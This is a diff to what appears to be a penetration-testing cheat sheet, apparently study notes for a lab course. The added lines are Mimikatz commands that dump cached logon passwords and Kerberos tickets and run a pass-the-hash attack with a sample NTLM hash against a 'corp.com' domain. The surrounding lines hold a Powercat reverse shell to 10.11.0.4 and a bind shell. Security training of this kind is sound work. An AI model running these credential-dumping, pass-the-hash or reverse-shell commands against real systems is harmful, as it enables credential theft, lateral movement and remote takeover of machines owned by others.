@@ -106,6 +106,11 @@ tcpdump -i tun0 icmp -v   # listen for icmp ping to tun0 interface
 privilege::debug
 token::elevate
 lsadump::sam
+-----------------AD Enumeration-------------------
+sekurlsa::logonpasswords
+sekurlsa::tickets
+kerberos::list
+sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe    # using ntlm of other user (retrieved from logonpasswords) to execute a program
 ```
 
 ### Powercat
@@ -113,7 +118,6 @@ lsadump::sam
 . .\powercat.ps1
 powercat -c 10.11.0.4 -p 443 -e cmd.exe   # reverse shell
 powercat -l -p 443 -e cmd.exe   # bind shell
-
 ```
 
 ### wget equivalant / file transfer
